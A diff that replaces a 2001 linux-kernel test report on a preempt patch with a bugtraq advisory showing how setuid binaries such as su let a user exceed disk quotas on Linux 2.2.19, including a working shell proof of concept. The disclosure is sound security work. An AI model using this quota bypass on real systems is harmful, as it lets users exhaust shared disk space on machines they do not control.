@@ -1,51 +1,67 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id <S278410AbRJVIfZ>; Mon, 22 Oct 2001 04:35:25 -0400
+	id <S278437AbRJVInQ>; Mon, 22 Oct 2001 04:43:16 -0400
 Received: (majordomo@vger.kernel.org) by vger.kernel.org
-	id <S278344AbRJVIfG>; Mon, 22 Oct 2001 04:35:06 -0400
-Received: from fe170.worldonline.dk ([212.54.64.199]:47117 "HELO
-	fe170.worldonline.dk") by vger.kernel.org with SMTP
-	id <S278281AbRJVIe4>; Mon, 22 Oct 2001 04:34:56 -0400
-Message-ID: <3BD3D867.4000907@eisenstein.dk>
-Date: Mon, 22 Oct 2001 10:27:19 +0200
-From: Jesper Juhl <juhl@eisenstein.dk>
-Organization: Eisenstein
-User-Agent: Mozilla/5.0 (X11; U; Linux 2.2.16 i586; en-US; m18) Gecko/20010131 Netscape6/6.01
-X-Accept-Language: en
+	id <S278428AbRJVInH>; Mon, 22 Oct 2001 04:43:07 -0400
+Received: from lama.supermedia.pl ([212.75.96.18]:61446 "EHLO
+	lama.supermedia.pl") by vger.kernel.org with ESMTP
+	id <S276814AbRJVImy>; Mon, 22 Oct 2001 04:42:54 -0400
+Date: Mon, 22 Oct 2001 10:43:13 +0200 (CEST)
+From: =?ISO-8859-2?Q?Wojciech_Purczy=F1ski?= <wp@supermedia.pl>
+To: <bugtraq@securityfocus.com>, <linux-kernel@vger.kernel.org>
+Subject: Overriding qouta limits in Linux kernel
+Message-ID: <Pine.LNX.4.33.0110220947590.29104-100000@lama.supermedia.pl>
 MIME-Version: 1.0
-To: Robert Love <rml@tech9.net>
-CC: linux-kernel@vger.kernel.org
-Subject: Re: [PATCH] updated preempt-kernel
-In-Reply-To: <1003562833.862.65.camel@phantasy>
-Content-Type: text/plain; charset=us-ascii; format=flowed
-Content-Transfer-Encoding: 7bit
+Content-Type: TEXT/PLAIN; charset=ISO-8859-2
+Content-Transfer-Encoding: 8BIT
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-Robert Love wrote:
 
-> Testers Wanted:
+Almost any suid binary may be used to create large files overriding quota
+limits.
 
-So I tested it :)
+When setuid-root binary inherits file descriptors from user process it may
+write to it without respecting the quota restrictions. This is because
+suid process has CAP_SYS_RESOURCE effective capability enabled during
+writing to the file. Quota does not know anything about who opened file
+descriptor and checks current process privileges only. This is bug in
+kernel and not in those setuid-root binaries.
 
-> patches to enable a fully preemptible kernel are available at:
-> 	http://tech9.net/rml/linux
-> for kernels 2.4.10, 2.4.12, 2.4.12-ac3, and 2.4.13-pre5.
+Tested on Linux kernel 2.2.19.
 
-I tried out your patch yesterday with 2.4.13-pre6 (it applies cleanly to 
--pre6 although made for -pre5). I've been running with it for about a 
-day now and I have not seen any ill effects yet.
+Example:
 
-The system does seem slightly more responsive when stressed, but I don't 
-see (or feel) huge improvements like some other people - maybe I just 
-run a set of apps that don't benefit much from the preempt patches, or 
-my workload is not significant enough to notice.. I usually run things 
-like KDE2, XMMS, Nedit, x-cd-roast, Opera, Sylpheed and a lot of console 
-windows.
-This is on a 1.4Ghz Athlon Thunderbird with 512MB RAM.
+cliph$quota -u wp
+Disk quotas for user wp (uid 500):
+     Filesystem  blocks   quota   limit   files   quota   limit
+      /dev/hda6       4      10      10       1      10      10
 
-Are there any tests you'd like me to try out on this box?
+cliph$perl -e 'print "a"x16384' >>myfile
+/vol1: write failed, user disk limit reached.
 
+cliph$ls -l myfile
+-rw-rw-r--    1 wp       wp           4096 Oct 22 10:33 myfile
 
-- Jesper Juhl - juhl@eisenstein.dk
+cliph$su $(perl -e 'print "a"x16384') 2>>myfile
+cliph$ # ^^^ this is it: su writes error message to fd 2 without limits
+
+cliph$ls -l myfile
+-rw-rw-r--    1 wp       wp          20505 Oct 22 10:34 myfile
+
+cliph$quota -u wp
+Disk quotas for user wp (uid 500):
+     Filesystem  blocks   quota   limit   files   quota   limit
+      /dev/hda6      28*     10      10       2      10      10
+
+(I removed `grace' fields from quota output)
+
+PS: Please include my address in CC as I may be not subscribed to the
+list(s).
+
+_________________________________________________________________
+ Wojciech Purczyñski | Security Officer | http://cliph.linux.pl/
+-----------------------------------------------------------------
+ Murphy's law says that there is always one more bug...
+          ...but he forgot to mention whether it is exploitable.
 
